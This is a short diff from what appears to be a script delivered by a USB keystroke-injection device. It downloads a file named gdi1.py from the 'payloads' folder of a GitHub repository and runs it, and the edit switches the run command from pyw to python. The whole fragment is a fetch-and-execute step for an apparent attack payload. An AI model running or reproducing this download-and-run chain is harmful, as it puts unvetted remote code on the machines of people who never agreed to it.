@@ -20,4 +20,4 @@ else {
 }
 
 curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output gdi1.py
-pyw -c gdi1.py
+python gdi1.py
